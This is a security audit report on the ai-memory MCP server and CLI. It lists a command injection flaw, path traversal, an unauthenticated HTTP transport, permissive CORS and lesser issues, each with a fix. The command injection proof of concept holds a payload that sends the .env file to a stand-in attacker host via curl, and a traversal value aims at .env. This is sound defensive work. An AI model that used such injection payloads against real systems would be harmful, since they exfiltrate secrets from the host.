# Security Audit Report — ai-memory

**Project:** @radix-ai/ai-memory  
**Audit Date:** 2026-03-15  
**Scope:** Full codebase security review  
**Auditor:** Security Sentinel (OWASP-focused)

---

## Executive Summary

The ai-memory project is an MCP server and CLI for persistent AI project memory. The audit identified **1 High**, **3 Medium**, and **4 Low** severity findings, plus several informational items. The codebase demonstrates good security practices in path traversal prevention for `commit_memory` and `memory://file/` resources, but has notable gaps in HTTP transport security, command injection in `sync_memory`, and path validation for `claim_task`.

**Overall Risk Level:** **Medium** — Address High and Medium findings before exposing the HTTP transport in production or shared environments.

---

## Findings by Severity

### Critical

*None identified.*

---

### High

#### H-1: Command Injection in `sync_memory` Tool

**Location:** `src/mcp-server/tools.ts` lines 737–758

**Description:** The `sync_memory` tool passes user-controlled `message` into `execSync()` as a shell command string. Although double quotes are escaped, the shell still interprets backticks and `$(...)` command substitution.

**Impact:** An attacker (or malicious AI prompt) could inject commands via the commit message, e.g. `$(whoami)`, `` `id` ``, or newline-based injection, leading to arbitrary code execution on the host.

**Proof of Concept:**
```json
{ "message": "$(curl -d \"$(cat .env)\" https://attacker.com/exfil)" }
```

**Remediation:** Use the array form of `execSync` to avoid shell interpretation:

```typescript
// Before (vulnerable)
execSync(`git commit -m "${commitMsg.replace(/"/g, '\\"')}"`, execOpts);

// After (safe)
const { execFileSync } = await import("child_process");
execFileSync("git", ["commit", "-m", commitMsg], execOpts);
```

**Note:** `execFileSync` does not invoke a shell by default; arguments are passed literally.

---

### Medium

#### M-1: Path Traversal in `claim_task` Source Parameter

**Location:** `src/mcp-server/tools.ts` lines 491–497

**Description:** The `claim_task` tool accepts a user-controlled `source` parameter that specifies a file path within `.ai/`. The path is joined with `aiDir` and read without validation. There is no path traversal check.

**Impact:** An attacker can read arbitrary files outside `.ai/` by passing `source: "../../../.env"` or similar.

**Remediation:** Add the same path traversal check used in `commit_memory`:

```typescript
const sourceFullPath = resolve(aiDir, sourcePath);
const rel = relative(aiDir, sourceFullPath);
if (rel.startsWith("..") || rel.startsWith("/") || rel.includes("..")) {
  throw new McpError(ErrorCode.InvalidRequest, "Path traversal not allowed.");
}
```

---

#### M-2: HTTP Transport Has No Authentication

**Location:** `src/mcp-server/index.ts` lines 34–78

**Description:** When `--http` is used, the MCP server listens on a configurable port (default 3100) with no authentication. Any client that can reach the port can invoke all tools and read all resources.

**Impact:** In cloud or shared environments, an unauthenticated HTTP endpoint exposes full read/write access to `.ai/` and git operations (via `sync_memory`).

**Remediation:**
- Document that HTTP mode is intended for trusted networks only.
- Add optional API key or bearer token authentication when `AI_MEMORY_AUTH_TOKEN` is set.
- Consider binding to `127.0.0.1` by default when `--http` is used.

---

#### M-3: CORS Allows Any Origin

**Location:** `src/mcp-server/index.ts` lines 46–48

**Description:** `Access-Control-Allow-Origin: *` allows any origin to make requests to the MCP HTTP endpoint.

**Impact:** Combined with no authentication, any website can call the MCP API if the user has the server running and the browser can reach it (e.g. localhost or same network).

**Remediation:** Restrict to known origins when `--http` is used, or use a configurable allowlist. For local-only use, consider omitting CORS or setting it to `null` for same-origin only.

---

### Low

#### L-1: Health Endpoint Information Disclosure

**Location:** `src/mcp-server/index.ts` lines 57–60

**Description:** The `/health` endpoint returns `{ status: "ok", aiDir }` including the full `aiDir` path.

**Impact:** Reveals the project root path on the host. Low impact in isolation but useful for reconnaissance.

**Remediation:** Return only `{ status: "ok" }` or a hash of the path. Avoid exposing full paths in public endpoints.

---

#### L-2: `memory://file/` URI May Need URL Decoding

**Location:** `src/mcp-server/resources.ts` lines 160–167

**Description:** The `memory://file/{path}` resource uses the URI path segment as-is without `decodeURIComponent`. Legitimate paths like `memory/decisions.md` encoded as `memory%2Fdecisions.md` would not resolve correctly.

**Impact:** Correct behavior for standard URIs; no security impact. The path traversal check uses `resolve` and `relative`; decoded paths would still be validated.

**Remediation:** Apply `decodeURIComponent` to `relativePath` before resolution for correct URI handling. Ensure the path traversal check runs after decoding.

---

#### L-3: ReDoS Risk from User-Controlled Regex in `validate_context`

**Location:** `src/mcp-server/tools.ts` lines 174–181

**Description:** The `validate_context` tool parses regex patterns from `harness.json`, which is compiled from user-controlled [P0] entries.

**Impact:** Malicious or poorly crafted regex patterns could cause catastrophic backtracking (ReDoS), leading to CPU exhaustion and denial of service.

**Remediation:** Add regex complexity or execution time limits. Consider validating patterns or using a safe regex subset. Document that [P0] entries are trusted content.

---

#### L-4: Dynamic Import of Custom Evals (Unsafe Code Loading)

**Location:** `src/evals/index.ts` lines 63–69

**Description:** Custom evals in `temp/custom-evals/` are loaded via dynamic `import()`. These files are user-controlled (in `.ai/`).

**Impact:** Users can add arbitrary code that runs when `ai-memory eval` is executed. This is by design for extensibility but could be a risk if `.ai/` is writable by untrusted parties (e.g. shared repo).

**Remediation:** Document that custom evals run with full privileges. Consider sandboxing or a separate process for custom evals if multi-tenant use is planned.

---

### Informational

#### I-1: `.env` and `.env.local` in `.gitignore`

**Status:** ✓ Correct.

`.gitignore` excludes `.env` and `.env.local`, reducing risk of committing secrets.

---

#### I-2: js-yaml Usage

**Status:** ✓ Safe.

The project uses `js-yaml` v4.x. In v4, `load()` is safe by default (replaces `safeLoad`). No unsafe deserialization risk from YAML in [P0] constraint blocks.

---

#### I-3: Path Traversal Protection in `commit_memory` and `memory://file/`

**Status:** ✓ Implemented.

Both `commit_memory` and `memory://file/` use `resolve` + `relative` checks to prevent path traversal. Logic is correct.

---

#### I-4: No Hardcoded Secrets

**Status:** ✓ Clean.

No hardcoded API keys, passwords, or tokens in source code. `AI_DIR` is the only env var used.

---

#### I-5: Dependencies

**Status:** ✓ No known vulnerabilities.

`npm audit` reports 0 vulnerabilities for direct and transitive dependencies.

---

## OWASP Top 10 Coverage

| Category | Status | Notes |
|----------|--------|-------|
| A01: Broken Access Control | Partial | HTTP transport has no auth; path traversal fixed in `commit_memory` but missing in `claim_task` |
| A02: Cryptographic Failures | N/A | No crypto in scope |
| A03: Injection | Partial | Command injection in `sync_memory`; path traversal in `claim_task` |
| A04: Insecure Design | Partial | HTTP mode designed for trusted use; document constraints |
| A05: Security Misconfiguration | Partial | CORS `*`; health endpoint leaks path |
| A06: Vulnerable Components | ✓ | Dependencies clean |
| A07: Auth Failures | Partial | No auth on HTTP transport |
| A08: Data Integrity | Partial | YAML from trusted sources; JSON.parse on internal files |
| A09: Logging Failures | N/A | No sensitive data in logs observed |
| A10: SSRF | N/A | No outbound fetch |

---

## Remediation Roadmap

### Immediate (Before Production HTTP Use)

1. **H-1:** Fix command injection in `sync_memory` using `execFileSync` with array args.
2. **M-1:** Add path traversal validation to `claim_task` source parameter.
3. **M-2:** Add authentication or document that HTTP mode is for trusted networks only.

### Short Term

4. **M-3:** Restrict CORS or make it configurable.
5. **L-1:** Remove or sanitize `aiDir` from health response.
6. **L-2:** Add `decodeURIComponent` for `memory://file/` paths if needed for correct URI handling.

### Medium Term

7. **L-3:** Add ReDoS mitigations for regex patterns (timeout or complexity limits).
8. **L-4:** Document custom eval security model.

---

## Security Checklist

| Item | Status |
|------|--------|
| Input validation on all tool parameters | Partial |
| Path traversal protection on file operations | Partial |
| No hardcoded secrets | ✓ |
| No SQL injection (N/A) | ✓ |
| Dependencies without known vulnerabilities | ✓ |
| Authentication on HTTP endpoints | ✗ |
| CORS restricted | ✗ |
| Command injection prevented | ✗ |
| Sensitive data in logs | ✓ |
| Error messages sanitized | ✓ |

---

## Appendix: Files Reviewed

- `src/mcp-server/index.ts` — MCP server, HTTP transport, CORS
- `src/mcp-server/tools.ts` — All MCP tools; path handling, execSync
- `src/mcp-server/resources.ts` — Resource URIs; path traversal
- `src/mcp-server/p0-parser.ts` — YAML parsing
- `src/cli/index.ts` — CLI
- `src/formatter/index.ts` — Frontmatter validation
- `src/evals/index.ts` — Eval runner, custom eval loading
- `package.json` — Dependencies
- `.gitignore` — Secrets exclusion

---

*Report generated by Security Sentinel. Re-audit after implementing remediation.*
